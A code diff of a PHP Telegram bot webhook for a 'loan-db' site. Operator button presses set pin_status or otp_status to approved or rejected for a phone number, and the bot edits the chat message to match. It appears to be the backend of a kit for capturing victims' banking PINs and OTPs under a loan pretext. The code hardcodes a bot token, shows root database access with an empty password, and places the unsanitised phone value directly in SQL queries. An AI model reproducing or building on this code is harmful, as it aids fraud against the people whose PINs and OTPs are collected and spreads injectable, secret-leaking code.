@@ -1,29 +1,42 @@
-<?php
-// Optional: connect to database if you want to track approval
-$host = "localhost";
-$user = "root";
-$password = "";
-$database = "loan-db";
-$conn = new mysqli($host, $user, $password, $database);
-if ($conn->connect_error) { die("Connection failed: " . $conn->connect_error); }
-
-$update = json_decode(file_get_contents("php://input"), true);
-
 if(isset($update['callback_query'])){
     $data = $update['callback_query']['data'];
     $chatId = $update['callback_query']['message']['chat']['id'];
     $messageId = $update['callback_query']['message']['message_id'];
 
-    if($data == 'approve_pin'){
-        // Update DB if needed
-        file_get_contents("https://api.telegram.org/8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=✅ Approved");
-        // Optionally mark user as approved in database
+    // Split the data (approve_pin_2526xxxx)
+    $parts = explode('_', $data);
+
+    $action = $parts[0]; // approve or reject
+    $type   = $parts[1]; // pin or otp
+    $phone  = $parts[2]; // phone number
+
+    // ===== PIN =====
+    if($type == 'pin'){
+        if($action == 'approve'){
+            $conn->query("UPDATE user_details SET pin_status='approved' WHERE phone='$phone'");
+
+            file_get_contents("https://api.telegram.org/bot8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=✅ PIN Approved");
+        }
+
+        if($action == 'reject'){
+            $conn->query("UPDATE user_details SET pin_status='rejected' WHERE phone='$phone'");
+
+            file_get_contents("https://api.telegram.org/bot8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=❌ PIN Rejected");
+        }
     }
 
-    if($data == 'reject_pin'){
-        file_get_contents("https://api.telegram.org/8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=❌ Rejected");
-        // Optionally mark user as rejected in database
-        // You can redirect user to re-enter data if your waiting page checks DB status
+    // ===== OTP =====
+    if($type == 'otp'){
+        if($action == 'approve'){
+            $conn->query("UPDATE user_details SET otp_status='approved' WHERE phone='$phone'");
+
+            file_get_contents("https://api.telegram.org/bot8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=✅ OTP Approved");
+        }
+
+        if($action == 'reject'){
+            $conn->query("UPDATE user_details SET otp_status='rejected' WHERE phone='$phone'");
+
+            file_get_contents("https://api.telegram.org/bot8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=❌ OTP Rejected");
+        }
     }
 }
-?>
